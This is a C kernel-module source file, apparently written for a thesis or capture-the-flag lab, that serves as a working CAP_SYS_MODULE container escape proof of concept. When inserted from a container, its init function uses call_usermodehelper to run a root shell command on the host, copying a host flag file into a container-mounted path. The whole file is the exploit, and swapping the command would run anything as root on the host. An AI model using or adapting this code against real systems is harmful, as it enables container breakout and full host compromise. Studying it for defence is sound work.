/*
 * escape.c -- CAP_SYS_MODULE container escape proof-of-concept.
 *
 * Loaded with insmod from inside a container that holds CAP_SYS_MODULE.
 * On init it uses call_usermodehelper() to run a userspace command as root
 * on the host, writing the host flag to a path mounted into the container.
 *
 * Deliberately minimal: only printk + call_usermodehelper, so it does not
 * depend on unrelated kernel headers that change between minor versions.
 */

#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/umh.h>

MODULE_LICENSE("GPL");
MODULE_AUTHOR("thesis-poc");
MODULE_DESCRIPTION("CAP_SYS_MODULE escape PoC: call_usermodehelper reads host flag");

/* Set by insmod, e.g. insmod escape.ko target=/tmp/cap_mod_flag */
static char *target = "/tmp/cap_mod_flag";
module_param(target, charp, 0644);
MODULE_PARM_DESC(target, "host path to write the flag to");

static char *source = "/flag.txt";
module_param(source, charp, 0644);
MODULE_PARM_DESC(source, "host path of the flag to read");

static int __init escape_init(void)
{
    char *argv[] = { "/bin/sh", "-c", "cat SOURCE > TARGET 2>/dev/null", NULL };
    char *envp[] = { "HOME=/", "PATH=/sbin:/bin:/usr/sbin:/usr/bin", NULL };
    char cmd[512];
    int ret;

    /* Build the command string with the configured paths. */
    (void)scnprintf(cmd, sizeof(cmd), "cat %s > %s 2>/dev/null", source, target);
    argv[2] = cmd;

    printk(KERN_INFO "escape: loading, source=%s target=%s\n", source, target);
    ret = call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);
    printk(KERN_INFO "escape: call_usermodehelper ret=%d\n", ret);
    return 0;
}

static void __exit escape_exit(void)
{
    printk(KERN_INFO "escape: unloaded\n");
}

module_init(escape_init);
module_exit(escape_exit);
